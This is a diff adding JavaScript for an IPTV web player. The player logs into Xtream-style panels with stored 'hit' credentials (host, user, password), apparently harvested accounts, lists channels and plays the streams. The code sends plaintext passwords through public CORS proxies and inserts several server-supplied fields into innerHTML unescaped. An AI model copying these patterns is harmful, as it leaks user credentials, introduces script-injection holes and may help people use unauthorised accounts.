+            <i class="fas fa-satellite-dish" style="color:var(--accent);"></i>
+            <div style="flex:1"><div class="hit-item-name">${r.user}</div><div class="hit-item-source">${r.host}</div></div>
+        </div>
+    `).join('');
+}
+
+async function loadHitIntoPlayer(hit) {
+    activeHit = hit;
+    $('cat-list').innerHTML = '<div style="padding:10px;text-align:center;">Yükleniyor...</div>';
+    $('ch-list').innerHTML = '<div style="padding:12px;text-align:center;color:var(--secondary);font-size:.8rem;">Kategori seçin</div>';
+    
+    let target = `${hit.host}/player_api.php?username=${hit.user}&password=${hit.pass}&action=get_live_categories`;
+    let pMode = hit.proxyMode || 'none';
+    let finalUrl = target;
+
+    if(pMode === 'corsproxy') finalUrl=`https://corsproxy.io/?${encodeURIComponent(target)}`;
+    else if(pMode === 'codetabs') finalUrl=`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(target)}`;
+    else if(pMode === 'allorigins') finalUrl=`https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`;
+    
+    try {
+        let res = await fetch(finalUrl); 
+        let data = await res.json();
+        window._currentCats = data;
+        renderCats(data);
+    } catch(e) { $('cat-list').innerHTML = '<div style="color:red;padding:10px;">Hata oluştu! Panel geçici olarak cevap vermiyor.</div>'; }
+}
+
+function renderCats(data) {
+    if(!data || !data.length) { $('cat-list').innerHTML='Kategori yok'; return; }
+    $('cat-list').innerHTML = data.map(c => `<div class="cat-item" onclick="loadChannels('${c.category_id}')"><span>${c.category_name}</span></div>`).join('');
+}
+
+async function loadChannels(catId) {
+    $('ch-list').innerHTML = '<div style="padding:10px;text-align:center;">Kanallar çekiliyor...</div>';
+    let target = `${activeHit.host}/player_api.php?username=${activeHit.user}&password=${activeHit.pass}&action=get_live_streams&category_id=${catId}`;
+    let pMode = activeHit.proxyMode || 'none';
+    let finalUrl = target;
+
+    if(pMode === 'corsproxy') finalUrl=`https://corsproxy.io/?${encodeURIComponent(target)}`;
+    else if(pMode === 'codetabs') finalUrl=`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(target)}`;
+    else if(pMode === 'allorigins') finalUrl=`https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`;
+    
+    try {
+        let res = await fetch(finalUrl); 
+        let data = await res.json();
+        $('ch-list').innerHTML = data.map(ch => `<div class="ch-item" onclick="playVideo('${ch.stream_id}', '${escHtml(ch.name)}')"><i class="fas fa-tv" style="color:var(--secondary)"></i> ${escHtml(ch.name)}</div>`).join('');
+    } catch(e) { $('ch-list').innerHTML = 'Hata'; }
+}
+
+function filterCats() {
+    let q = $('cat-search').value.toLowerCase();
+    if(!window._currentCats) return;
+    let f = window._currentCats.filter(c => c.category_name.toLowerCase().includes(q));
+    renderCats(f);
+}
+
+function filterChannels() {
+    let q = $('ch-search').value.toLowerCase();
+    let items = document.querySelectorAll('.ch-item');
+    items.forEach(i => {
+        if(i.textContent.toLowerCase().includes(q)) i.style.display = 'flex';
+        else i.style.display = 'none';
+    });
+}
+
+function playVideo(streamId, name) {
+    let streamUrl = `${activeHit.host}/live/${activeHit.user}/${activeHit.pass}/${streamId}.m3u8`;
+    $('now-playing').style.display=''; $('np-title').textContent = name;
+    $('video-placeholder').style.display='none'; 
+    let v = $('main-video'); v.style.display='';
+    window._lastStreamUrl = streamUrl; 
+
+    setTimeout(() => {
+        const videoWrap = document.getElementById('video-wrap');
+        if (videoWrap) {
+            videoWrap.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+    }, 150);
+
+    if(window._hls) { window._hls.destroy(); window._hls = null; }
+
+    if(Hls.isSupported()) {
+        window._hls = new Hls(); window._hls.loadSource(streamUrl); window._hls.attachMedia(v);
+        window._hls.on(Hls.Events.MANIFEST_PARSED, () => v.play().catch(e=>console.log("Auto-play engellendi.")));
+        window._hls.on(Hls.Events.ERROR, function (event, data) {
+            if (data.fatal) {
+                showNotif("Video CORS engeline takıldı. Harici VLC/Wuffy butonunu kullanın.", "warning");
+            }
+        });
+    } else if(v.canPlayType('application/vnd.apple.mpegurl')) {
+        v.src = streamUrl; v.play();
+    }
+}
+
+function toggleFullscreen() {
+    let wrap = $('video-wrap');
+    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+        if (wrap.requestFullscreen) { wrap.requestFullscreen(); } 
+        else if (wrap.webkitRequestFullscreen) { wrap.webkitRequestFullscreen(); } 
+    } else {
+        if (document.exitFullscreen) { document.exitFullscreen(); } 
+        else if (document.webkitExitFullscreen) { document.webkitExitFullscreen(); }
+    }
+}
+
+function openIntent(packageName) {
+    if(!window._lastStreamUrl) { showNotif("Önce bir kanal seçin!", "error"); return; }
+    
+    const url = window._lastStreamUrl;
+    
+    if (navigator.userAgent.toLowerCase().includes("android")) {
+        try {
+            let urlObj = new URL(url);
+            let scheme = urlObj.protocol.replace(':', '');
+            let hostAndPath = urlObj.host + urlObj.pathname + urlObj.search;
+            let b64Url = btoa(url);
+
+            let intentUrl = `intent://${hostAndPath}#Intent;scheme=${scheme};package=${packageName};type=video/*;S.title=InadinaTV;S.b64url=${b64Url};end;`;
+
+            let a = document.createElement('a');
+            a.href = intentUrl;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        } catch(err) {
+            showNotif("Link dönüştürme hatası.", "error");
+        }
+    } else {
+        if(packageName === 'org.videolan.vlc') {
+            window.location.href = `vlc://${url}`;
+        } else {
+            showNotif("Wuffy Player sadece Android cihazlarda çalışır.", "warning");
+        }
+    }
+}
+
+function ensureHlsJs() {
+    if(window.Hls) return;
+    let s = document.createElement('script');
+    s.src = "https://cdn.jsdelivr.net/npm/hls.js@latest";
+    document.head.appendChild(s);
+}
+</script>
+</body>
+</html>
